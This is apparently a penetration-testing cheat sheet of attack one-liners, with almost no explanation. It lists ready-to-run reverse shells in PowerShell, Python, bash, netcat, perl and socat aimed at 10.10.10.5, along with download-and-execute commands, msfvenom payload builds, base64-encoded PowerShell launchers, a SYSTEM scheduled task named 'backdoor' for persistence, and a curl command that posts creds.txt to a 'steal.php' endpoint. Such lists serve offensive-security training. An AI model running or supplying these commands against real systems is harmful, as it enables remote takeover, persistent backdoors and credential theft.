

# Powershell: Reverse shell (TCP)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.5',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"

## Download and execute remote script
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/backdoor.ps1')"

## Encoded PowerShell launcher
powershell -EncodedCommand UwB0AGEAcgB0AC0AcwBoAGUAbABsACAAYwBvAG0AbQBhAG4AZAAgAGEAbABsAG8AdwBlAGQAIABiAHkAIAB0AGgAZQAgAHMAeQBzAHQAZQBtAA==


# Python: Reverse Shell

## Basic Linux reverse shell
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'


# Bash One-Liners
## Netcat reverse shell
nc -e /bin/bash 10.10.10.5 4444

## Bash TCP shell (no nc)
bash -i >& /dev/tcp/10.10.10.5/4444 0>&1

# MSFvenom Payloads

## Windows reverse TCP shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe > shell.exe

## Linux reverse shell (ELF)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf > shell.elf











nc -e /bin/sh 10.10.10.5 4444

powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/a.ps1')"

bash -i >& /dev/tcp/10.10.10.5/443 0>&1

python -c 'import pty; pty.spawn("/bin/bash")'

curl -s http://10.10.10.5:8080 | bash

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe > met.exe

powershell -e aQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAY3QAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4ANQAvAGIAYQBjAGsAZABvAG8AcgAuAHAAcwAxACIAKQA=

perl -e 'use Socket;$i="10.10.10.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

wget http://10.10.10.5/evil.sh && chmod +x evil.sh && ./evil.sh

openssl s_client -connect 10.10.10.5:443

socat TCP4-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

echo 'bash -i >& /dev/tcp/10.10.10.5/5555 0>&1' > /tmp/.x && chmod +x /tmp/.x && /tmp/.x

curl http://10.10.10.5/reverse | sed 's/^/>/g' >> ~/.bash_history

schtasks /create /tn "backdoor" /tr "powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/r.ps1')" /sc minute /mo 1 /ru SYSTEM

echo aGVsbG8gd29ybGQ= | base64 -d

ftp 10.10.10.5

env x='(){:;};echo hacked' bash -c "echo this is a test"

curl -X POST -d @creds.txt http://10.10.10.5/steal.php

powershell -Command "$env:comspec"

whoami >> /dev/tcp/10.10.10.5/1337


python -c 'import pty; pty.spawn("/bin/bash")' ---- shell stabilizer

